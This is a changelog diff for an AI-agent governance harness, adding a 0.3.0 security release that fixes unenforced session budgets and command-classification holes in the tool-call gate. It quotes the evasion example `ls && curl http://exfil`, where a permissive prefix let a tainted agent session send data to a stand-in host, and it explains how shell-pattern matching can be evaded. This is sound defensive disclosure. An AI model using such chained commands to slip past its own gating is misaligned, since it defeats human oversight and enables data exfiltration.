@@ -12,42 +12,84 @@ there is one, so anything here can be traced to the reasoning in
 
 ## [Unreleased]
 
+## [0.3.0] — 2026-08-14
+
+A security release, and the first with breaking changes. All three come from one
+place: a control that existed, read as active, and enforced nothing. Fixing each
+meant refusing input that was previously accepted — so the break is the fix, not a
+side effect of it.
+
+Everything here came out of the self-review that also produced 0.2.2; the full
+write-up is in
+[`docs/reviews/2026-08-12-full-codebase-review.md`](docs/reviews/2026-08-12-full-codebase-review.md).
+
+### Migration
+
+Three things to check. Each fails loudly with a message naming the field, so
+nothing changes silently.
+
+1. **Does your manifest declare `command_classes` without `default_to`?** It will
+   no longer compile. Add a catch-all pointing at an approval-required,
+   network-effectful action — that bucket is what makes classification safe, since
+   pattern matching over shell strings is always evadable.
+2. **Does it declare two classifiers for the same action?** It will no longer
+   compile. Merge them; only the first ever ran.
+3. **Do you call the `harness gate` wire ABI directly** (rather than through
+   `cc-hook` / `agy-hook`, which handle this for you) **against a world declaring a
+   counted budget?** Send `context.usage` — `{}` is valid and means "nothing used
+   yet". Omitting it now returns `DENY` / `missing_usage`. `command_timeout_ms`
+   alone does not count as a counted budget.
+
+All six manifests shipped in this repository already satisfy 1 and 2.
+
+### Security
+
+- **Manifest budgets are now enforced** (D64). `Budget` and its limit checks were
+  complete, but every decision path constructed a zeroed `BudgetUsage`, so each
+  call was evaluated as the session's first and `max_commands_per_task`,
+  `max_network_calls`, `max_file_writes` and `max_tokens_per_session` were
+  decorative in every manifest declaring them. Counters are now carried session
+  state, exactly like taint: `context.usage` in and out of the gate ABI, persisted
+  by the adapters in a `usage-<session>` sidecar, held in memory by the long-lived
+  gateway and orchestrator. Charged only on an ALLOW that will actually run, so a
+  refusal never pushes a session toward its limit. **Breaking** — see Migration 3.
+  This is the fourth fail-closed hardening of ABI v1, after `taint`,
+  `source_channel` and `path`, and like those it does not bump `v`: a version bump
+  would let a caller pin v1 and keep running ungoverned.
+- **Command classification no longer lets declaration order decide a verdict**
+  (finding #17, D63). Every class is evaluated; a command claimed by two different
+  classes resolves to `default_to` rather than to whichever was declared first. A
+  world listing a permissive class ahead of a restrictive one previously classified
+  `ls && curl http://exfil` by its `ls` prefix, so a tainted session was allowed to
+  run egress that bare `curl` was denied. Ranking classes by severity was rejected:
+  no semantic ordering over `SideEffectClass` exists, and deriving one from enum
+  declaration order would encode policy in enum layout.
+- **A `command_classes` classifier must declare `default_to`, and an action may
+  have only one classifier** (findings #19/#20, D62). Both are compile errors now.
+  `default_to` is the fail-closed bucket an evasion lands in, so its optionality
+  was the real hole — a manifest without one let a tainted session run arbitrary
+  unmatched shell. A second classifier for the same action silently never ran.
+  **Breaking** — see Migration 1 and 2.
+
 ### Changed
 
-- **Manifest budgets are now enforced** (Codex-scan finding, D64). `Budget` and its
-  limit checks were complete, but every decision path constructed a zeroed
-  `BudgetUsage`, so each call was evaluated as the session's first and
-  `max_commands_per_task`, `max_network_calls`, `max_file_writes` and
-  `max_tokens_per_session` were decorative in every manifest that declared them.
-  Counters are now carried session state, exactly like taint: `context.usage` in
-  and out of the gate ABI, persisted by the adapters in a `usage-<session>`
-  sidecar, held in memory by the long-lived gateway and orchestrator. Charged only
-  on an ALLOW that will actually run. **Breaking**: a world declaring a *counted*
-  limit now requires `context.usage`, and a request omitting it gets
-  `DENY` / `missing_usage` — the fourth fail-closed hardening of ABI v1, after
-  `taint`, `source_channel` and `path`, and like those it does not bump `v`.
-- The cross-host demo now prefers the freshly built debug binary over
+- The cross-host demo prefers the freshly built debug binary over
   `target/release/harness`. `check-demos.sh` builds debug and then runs the demo,
   so a stale release binary lying around meant the guard could validate a
   two-day-old kernel — which it did, passing locally while CI, with no release
   build, correctly failed. A guard that can check the wrong artifact is the same
-  family of bug as the rest of this release.
-- **Command classification no longer lets declaration order decide a verdict**
-  (finding #17, D63). Every class is evaluated; a command claimed by two different
-  classes resolves to `default_to` rather than to whichever was declared first.
-  Previously a world listing a permissive class ahead of a restrictive one
-  classified `ls && curl http://exfil` by its `ls` prefix, so a tainted session was
-  allowed to run egress that bare `curl` was denied. Ranking classes by severity was
-  rejected: no semantic ordering over `SideEffectClass` exists, and deriving one from
-  enum declaration order would encode policy in enum layout.
-- **A `command_classes` classifier must declare `default_to`, and an action may have
-  only one classifier** (findings #19/#20, D62). Both are now compile errors.
-  Pattern matching over shell strings is always evadable; `default_to` is the
-  fail-closed bucket an evasion lands in, so its optionality was the real hole — a
-  manifest without one let a tainted session run arbitrary unmatched shell. A second
-  classifier for the same action silently never ran. **Breaking** for any manifest
-  that omitted `default_to`; those are precisely the vulnerable ones, and the error
-  names the field and the consequence.
+  family of bug as the three above.
+- Test count 261 → 269.
+
+### Known issues
+
+Open findings are tracked as issues on
+[`agentic-execution-governance`](https://github.com/sv-pro/agentic-execution-governance/issues):
+`source_channel` is pinned to `user_prompt` on live hosts, so manifest channel
+trust is inert (#22); argument aliasing and schema validation are mutually
+exclusive, so a schema-bearing action fails on Antigravity (#23). An over-budget
+verdict is `REPLAN`, and no host exposes a "propose a smaller step" channel, so
+adapters fall through to the host's own prompt rather than denying.
 
 ## [0.2.2] — 2026-08-13
 
@@ -187,7 +229,8 @@ First version a stranger can install and use: `harness init` writes a starter
 manifest, the `PreToolUse` shim and the host settings entry, with nothing but the
 binary — no checkout, no `cargo`, no `jq`.
 
-[Unreleased]: https://github.com/sv-pro/ai2rules/compare/v0.2.2...HEAD
+[Unreleased]: https://github.com/sv-pro/ai2rules/compare/v0.3.0...HEAD
+[0.3.0]: https://github.com/sv-pro/ai2rules/compare/v0.2.2...v0.3.0
 [0.2.2]: https://github.com/sv-pro/ai2rules/compare/v0.2.1...v0.2.2
 [0.2.1]: https://github.com/sv-pro/ai2rules/compare/v0.2.0...v0.2.1
 [0.2.0]: https://github.com/sv-pro/ai2rules/compare/v0.1.2...v0.2.0
